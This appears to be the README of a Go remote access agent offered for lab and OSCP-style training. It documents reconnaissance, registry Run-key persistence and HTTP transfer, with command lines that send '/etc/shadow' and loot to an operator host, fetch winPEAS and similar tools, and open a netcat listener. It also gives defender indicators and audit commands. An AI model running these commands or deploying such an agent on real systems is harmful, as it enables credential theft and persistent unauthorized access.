# Task-Based Remote Agent (Go)

> **⚠️ EDUCATIONAL SECURITY RESEARCH TOOL**  
> Remote agent for **educational and authorized security research purposes ONLY**.

[![Go](https://img.shields.io/badge/Go-1.16%2B-blue.svg)](https://golang.org/)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Status](https://img.shields.io/badge/Status-Educational-yellow.svg)]()
[![AV Detection](https://img.shields.io/badge/AV%20Detection-100%25-red.svg)]()

---

## 🔴 CRITICAL LEGAL DISCLAIMER

**THIS SOFTWARE IS FOR EDUCATIONAL, RESEARCH, AND AUTHORIZED SECURITY TESTING ONLY.**

### Quick Legal Facts

| ⚖️ Legal Status | Details |
|----------------|---------|
| **Authorization Required** | Explicit written permission MANDATORY |
| **Illegal Without Permission** | Computer Fraud & Abuse Act (USA), Computer Misuse Act (UK), etc. |
| **Criminal Penalties** | Fines and/or imprisonment in most jurisdictions |
| **Your Responsibility** | You are SOLELY liable for your actions |
| **Author Liability** | NONE - Tool provided "AS IS" |

### By Using This Software You Agree:

✅ You have explicit authorization for the target system  
✅ You understand applicable laws in your jurisdiction  
✅ You accept FULL LIABILITY for any consequences  
✅ Authors are NOT responsible for misuse  
✅ A disclaimer does NOT grant permission to break laws  

**⚠️ Unauthorized computer access is a CRIME. Always obtain written permission.**

<details>
<summary><b>📋 Click for Full Legal Disclaimer</b></summary>

### Applicable Laws (Non-Exhaustive)
- **USA**: Computer Fraud and Abuse Act (CFAA), 18 U.S.C. § 1030
- **EU**: Directive 2013/40/EU on attacks against information systems
- **UK**: Computer Misuse Act 1990
- **International**: Council of Europe Convention on Cybercrime

### Authorized Use Cases ONLY
✅ Personal VMs and lab environments you control  
✅ Authorized penetration testing with signed contracts  
✅ Professional certifications (OSCP, CRTP) in official labs  
✅ Academic research with IRB approval  
✅ Corporate red team with explicit authorization  

### NEVER Authorized
❌ Random internet systems  
❌ Workplace systems without security team approval  
❌ School/university systems without IT approval  
❌ Any system without WRITTEN permission  

### Reporting Illegal Use
If you become aware of illegal use:
- Report to local law enforcement
- Contact repository maintainers
- Document evidence

**We actively discourage illegal use and will cooperate with law enforcement.**

</details>

---

## 🎓 Educational Philosophy

### Why This Tool Exists

Understanding offensive techniques is crucial for building better defenses. This tool teaches:
- Command & Control (C2) architecture patterns
- Post-exploitation techniques  
- Windows persistence mechanisms
- System reconnaissance methods
- File transfer operations

### Intentional Design for Ethical Use

**This tool is deliberately designed to be EASILY DETECTABLE:**

| Feature | This Tool | Real Malware |
|---------|-----------|--------------|
| AV Detection | ✅ 100% | ❌ Evades |
| Obfuscation | ❌ None | ✅ Heavy |
| Anti-Analysis | ❌ None | ✅ Multiple |
| Encrypted C2 | ❌ Plain TCP | ✅ TLS/Custom |
| Code Clarity | ✅ Readable | ❌ Obfuscated |

**This is NOT a bug - it's a feature for legal protection.**

---

## 🏗️ Architecture

```
offensive-agent/
├── main.go
├── dispatcher/        → Session control and command routing
├── commands/          → Internal agent capabilities
│   ├── info/         → System information
│   ├── persistence/  → Windows persistence (T1547.001)
│   ├── recon/        → System enumeration (INTENTIONALLY DETECTED)
│   └── transfer/     → File upload/download (HTTP)
├── shell/            → System command executor
└── transport/        → TCP communication layer
```

### Key Components

| Component | Purpose | Detection |
|-----------|---------|-----------|
| **Dispatcher** | Session lifecycle & routing | Standard |
| **Persistence** | Registry Run keys (educational) | Easily detected |
| **Recon** | System enumeration | **TRIGGERS AV/EDR** |
| **Transfer** | HTTP file operations | Unencrypted (detectable) |
| **Shell** | Command execution | Standard process monitoring |

---

## 📚 Commands Reference

### Quick Command List

```bash
info                              # System information
recon [--quick|--full|--json]     # Reconnaissance (AV-DETECTED)
download <url> <dest>             # Download file via HTTP
upload <source> <url>             # Upload file via HTTP  
persistence <action> [strategy]   # Manage persistence
help                              # Show command menu
exit                              # Close session
```

---

### 🔍 `recon` - System Reconnaissance

**⚠️ INTENTIONALLY TRIGGERS ANTIVIRUS/EDR**

```bash
recon              # Standard enumeration
recon --quick      # Essential info only
recon --full       # Complete enumeration + defenses
recon --json       # JSON output
```

**Information Gathered:**
- **System**: OS, architecture, hostname, patches, uptime
- **Security**: User, groups, privileges, domain, integrity level
- **Network**: IPs, DNS, routes, domain controllers, connections
- **Defense**: AV status, firewall, EDR, logging (--full only)

**Detection Characteristics:**
- ✅ Detected by Windows Defender (W64.AIDetectMalware)
- ✅ Flagged by CrowdStrike, SentinelOne, Carbon Black
- ✅ Triggers behavioral heuristics
- ✅ Logged by Sysmon (Event IDs 1, 10, 11)
- ✅ Generates SIEM alerts

**Why Intentionally Detected:**
- Prevents real-world malicious use
- Ensures detection in production environments
- Educational value for blue team training
- Legal protection against misuse

**MITRE ATT&CK:** T1082, T1033, T1016

---

### 📁 `download` / `upload` - File Transfer

**Download files FROM operator TO target:**
```bash
download http://10.10.14.5:8080/winPEAS.exe C:\Temp\winpeas.exe
download http://192.168.1.10/linpeas.sh /tmp/linpeas.sh
```

**Upload files FROM target TO operator:**
```bash
upload C:\Windows\Temp\loot.zip http://10.10.14.5:8080/upload
upload /etc/shadow http://192.168.1.10:8080/upload
```

**Features:**
- HTTP-based transfer (unencrypted for detectability)
- Progress reporting with file size and speed
- Automatic directory creation
- Error handling and validation
- Works with standard Python HTTP servers

**Operator Setup:**

For downloads (serving files):
```bash
python3 -m http.server 8080
```

For uploads (receiving files):
```bash
python3 tools/upload_server.py 8080
```

**OSCP Use Cases:**
- Upload: winPEAS, linPEAS, mimikatz, exploits
- Download: SAM dumps, loot, screenshots, proof.txt

---

### 🔄 `persistence` - Windows Persistence

```bash
persistence enable registry_run_key    # Enable persistence
persistence status                      # Check status
persistence disable                     # Remove persistence
```

**Strategies:**
- `registry_run_key` - HKCU/HKLM Run key (T1547.001)
- `startup_folder` - Not yet implemented

**Detection:** Easily detected by Autoruns, Sysmon Event ID 13, registry monitoring

**MITRE ATT&CK:** T1547.001

---

### ℹ️ `info` - System Information

```bash
info    # Display OS, architecture, user, PID, working directory
```

---

## 🚀 Quick Start

### Building

```bash
git clone https://github.com/iojabal/offensive-agent.git
cd offensive-agent
go build -o agent.exe    # Windows
go build -o agent        # Linux
```

### Usage in Authorized Lab

**Start listener (Operator):**
```bash
nc -lvnp 4444
```

**Run agent (Target):**
```bash
./agent.exe
```

**Interact:**
```
[agent] C:\Users\test\Downloads > help
[agent] C:\Users\test\Downloads > info
[agent] C:\Users\test\Downloads > recon --quick
[agent] C:\Users\test\Downloads > download http://10.10.14.5:8080/tool.exe C:\Temp\tool.exe
```

---

## 🚨 Antivirus Detection (By Design)

### Real-World Detection Examples

**Windows Defender:**
```
Threat: W64.AIDetectMalware
Status: Quarantined
Detection: Behavioral analysis - Suspicious enumeration
```

**EDR Solutions:**
- **CrowdStrike:** "Suspicious Reconnaissance Activity" (Medium-High)
- **SentinelOne:** "Information Gathering Detected" (Process terminated)
- **Carbon Black:** "System Enumeration" (Multiple IOAs)

### Detection Timeline

```
T+0s   → Recon command initiated
T+2s   → First suspicious command logged
T+5s   → Behavioral pattern detected
T+8s   → EDR alert triggered
T+10s  → Defender quarantine decision
T+12s  → Process terminated by AV
```

### Detection Rate by Product

| Security Product | Detection | Method |
|------------------|-----------|--------|
| Windows Defender | ✅ 100% | Behavioral |
| CrowdStrike | ✅ 100% | ML + Behavioral |
| SentinelOne | ✅ 100% | Story-based |
| Carbon Black | ✅ 100% | IOA patterns |
| Sophos XG | ✅ 100% | Deep learning |

### Environment Comparison

| Environment | AV Status | Behavior | Detection |
|-------------|-----------|----------|-----------|
| OSCP Lab | Disabled | ✅ Works | None |
| HackTheBox | Disabled | ✅ Works | None |
| Corporate Net | Active | ❌ Blocked | Immediate |
| Personal VM | Active | ❌ Detected | <30s |
| Production | Active+EDR | ❌ Blocked | <10s |

**This is exactly how an educational tool should behave.**

---

## 🛡️ Detection & Defense

### For Blue Team / Defenders

**Detection Methods:**
- Registry monitoring (Sysmon Event ID 13)
- Process monitoring (Sysmon Event ID 1)
- Network monitoring (plain TCP traffic)
- Behavioral analysis (rapid command execution)

**Indicators of Compromise:**
- Registry value: `SysBackdoor`
- Multiple enumeration commands in succession
- `whoami /all`, `wmic`, `netstat -ano` patterns
- Processes from unusual locations

**Defense Recommendations:**
```powershell
# Enable audit policies
auditpol /set /subcategory:"Registry" /success:enable /failure:enable

# Deploy Sysmon
sysmon -accepteula -i sysmonconfig.xml

# Regular autoruns audit
autorunsc.exe -a -nobanner
```

**YARA Rules:** Available in `detection/yara/offensive-agent.yar`

---

## 📖 MITRE ATT&CK Mapping

| Technique | ID | Tactic | Status |
|-----------|-----|--------|--------|
| Registry Run Keys | T1547.001 | Persistence | Implemented |
| System Information Discovery | T1082 | Discovery | Implemented |
| System Owner/User Discovery | T1033 | Discovery | Implemented |
| System Network Config Discovery | T1016 | Discovery | Implemented |
| Command and Control | TA0011 | C2 | Basic TCP |
| Ingress Tool Transfer | T1105 | Command & Control | Implemented |

---

## 🐛 Known Limitations (By Design)

### Intentional Constraints

- ❌ Not a full interactive shell (limits utility)
- ❌ 100% detection by AV/EDR (prevents misuse)
- ❌ No anti-forensics (leaves audit trail)
- ❌ No obfuscation (transparent code)
- ❌ Plain text communications (detectable)
- ❌ No evasion techniques (triggers all controls)

**These are FEATURES for legal protection, not bugs.**

---

## 🗺️ Roadmap

### Implemented ✅
- [x] TCP transport layer
- [x] Command dispatcher
- [x] System information
- [x] Windows registry persistence
- [x] System reconnaissance (AV-detected)
- [x] HTTP file transfer (upload/download)

### Planned (All Will Remain Detectable) 🔄
- [ ] Scheduled task persistence (T1053.005)
- [ ] Linux persistence mechanisms
- [ ] Enhanced error handling
- [ ] Cross-platform compatibility

### Will NEVER Implement ⛔
- AMSI bypass / ETW patching
- Code obfuscation / packing
- Anti-debugging / sandbox evasion
- Encrypted C2 communications
- Credential harvesting
- Lateral movement automation
- Privilege escalation exploits

**Commitment:** Any new feature will maintain 100% AV detection and educational purpose.

---

## 📚 Learning Resources

- [MITRE ATT&CK](https://attack.mitre.org/) - Adversary tactics database
- [OffSec OSCP](https://www.offensive-security.com/pwk-oscp/) - Pentesting certification
- [HackTheBox](https://www.hackthebox.eu) - Authorized practice labs
- [TryHackMe](https://tryhackme.com) - Guided security training

---

## 📁 Project Structure

```
offensive-agent/
├── README.md                    # This file
├── LICENSE                      # MIT License
├── go.mod                       # Go module definition
├── main.go                      # Entry point
├── src/
│   ├── dispatcher/             # Session control
│   ├── commands/               # Command modules
│   │   ├── info/              
│   │   ├── persistence/       # Windows persistence
│   │   ├── recon/             # System enumeration (AV-detected)
│   │   └── transfer/          # File transfer (HTTP)
│   ├── shell/                 # Shell executor
│   └── transport/             # TCP layer
├── tools/
│   └── upload_server.py       # Python HTTP upload server
├── docs/
│   └── FILE_TRANSFER_GUIDE.md # Transfer usage guide
└── detection/
    └── yara/
        └── offensive-agent.yar # YARA detection rules
```

---

## 🤝 Contributing

Contributions welcome! Requirements:
- ✅ Maintain educational focus
- ✅ Keep 100% AV detection rate
- ✅ Include documentation
- ✅ Follow ethical guidelines
- ✅ Add detection guidance

**Pull requests that add evasion will be rejected.**

---

## 📄 License

MIT License - See [LICENSE](LICENSE) file.

**Additional Terms:**
- Educational use only
- Must not be weaponized for real attacks
- Must include this disclaimer in derivatives
- Author assumes no liability for misuse

---

## ⚖️ Final Warning

**Ignorance of the law is NOT a defense.**

Before using this tool:
1. ✅ Verify you OWN the system OR have WRITTEN authorization
2. ✅ Understand laws in your jurisdiction
3. ✅ Document your authorization
4. ✅ Stay within defined scope
5. ✅ When in doubt, DON'T

**Unauthorized access = Criminal offense = Fines/Imprisonment**

---

## 📞 Contact & Reporting

**Legitimate research inquiries:** [Your Email]

**Report illegal use:**
- 🇺🇸 USA: [FBI IC3](https://www.ic3.gov)
- 🇪🇺 EU: [Europol](https://www.europol.europa.eu)
- 🇬🇧 UK: [National Crime Agency](https://www.nationalcrimeagency.gov.uk)

---

## ⚠️ Forks & Modifications Notice

**If you fork or modify this project:**

You become responsible for your derivative work. Adding evasion techniques, obfuscation, or anti-analysis creates a NEW project with SEPARATE legal status.

**Modifications that violate ethics:**
- ❌ Antivirus evasion
- ❌ Code obfuscation
- ❌ Exploit integration
- ❌ Credential harvesting

**If you add these, it's YOUR project, YOUR responsibility.**

Report malicious forks to: abuse@github.com

---

## 🙏 Acknowledgments

This project exists to advance cybersecurity education and help defenders understand adversary techniques.

**Goal:** Make the internet safer, not more dangerous.

**Use responsibly, ethically, and legally.**

---

<div align="center">

**⚡ Built for Education | 🛡️ Designed to be Detected | ⚖️ Use Legally**

*Last Updated: February 2026*

</div>